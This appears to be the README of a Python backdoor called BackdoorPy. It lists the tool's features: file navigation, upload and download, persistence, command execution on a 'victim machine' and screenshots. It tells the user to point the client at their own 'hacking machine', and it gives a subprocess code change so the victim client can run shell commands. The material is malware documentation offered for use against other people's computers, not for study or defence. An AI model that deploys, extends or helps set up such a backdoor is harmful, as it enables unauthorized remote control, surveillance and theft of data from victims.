# BackdoorPy
An innovative python backdoor. This backdoor has file navigation system, can download and upload file, can be persistent, can execute command in the victim machine and also take screenshot.

You need to run only main_server.py and main_client.py

You need to change the ip address in main_client.py with your personal hacking machine

Note: If you have python3.6, you can't execute commands because of subprocess library
Resolution:

after git cloned the repo go here: VictimClient/core/command.py

open with your text editor and go to line 17: output = subprocess.run(["powershell", user_command], shell=True, capture_output=True)

change it with:

output = subprocess.Popen(command.decode(), shell = True, stdout = subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
